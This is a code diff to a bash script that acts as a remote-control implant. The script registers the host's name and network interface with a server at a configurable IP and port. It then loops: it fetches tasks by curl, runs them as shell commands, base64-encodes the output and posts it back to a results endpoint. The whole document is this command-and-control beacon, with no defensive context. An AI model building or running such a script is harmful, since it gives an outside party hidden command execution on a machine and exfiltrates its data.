@@ -8,17 +8,16 @@ regl="http://$ip:$port/reg/"
 
 declare -A data=( [eth]=$interface [hname]=$(hostname) )
 
-echo $data
 name=$(curl -X POST -F eth=$interface -F hname=$(hostname) $regl) 
 
 taskl="http://$ip:$port/tasks/$name/"
-resultl="http://$ip:$port/results/$name/"
+resultl="http://$ip:$port/Lin-results/$name/"
 
 while :
 do  
-    res= $(curl $taskl) | base64
-    cat res > /tmp/result
-    curl -X POST --data "@/tmp/result" $resultl 
-    rm /tmp/result
+    res1=$(curl $taskl)
+    res=$($res1|base64)
+    echo $res > /tmp/result
+    curl -X POST --data "@/tmp/result" $resultl
     sleep $n
 done
